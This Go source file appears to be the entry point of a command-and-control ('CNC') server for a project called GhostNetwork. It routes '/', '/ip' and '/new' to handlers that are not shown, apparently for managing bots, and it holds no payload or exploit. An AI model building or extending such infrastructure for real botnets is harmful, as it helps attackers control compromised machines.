package main

import (
	"log"
	"net/http"

	"GhostNetwork/CNCServer/handler"

	"github.com/gorilla/mux"
)

var useSSL = true
var myPort string = "8080"

// Create Ghost CNCServer, it supports http or https protocol
func GhostServer()  {
	router := mux.NewRouter()
	router.Use(handler.LoggingMiddleware)

	router.HandleFunc("/", handler.IndexHandler)
	router.HandleFunc("/ip", handler.IPHandler)
	router.HandleFunc("/new", handler.New)
	http.Handle("/",router)

	if useSSL != false{
		if err := http.ListenAndServeTLS(":"+myPort, "ssl/server.crt", "ssl/server.key", nil); err != nil{
			log.Fatal(err)
		}
	}
	if err := http.ListenAndServe(":"+myPort, nil); err != nil{
		log.Fatal(err)
	}
}

func main()  {
	GhostServer()
}
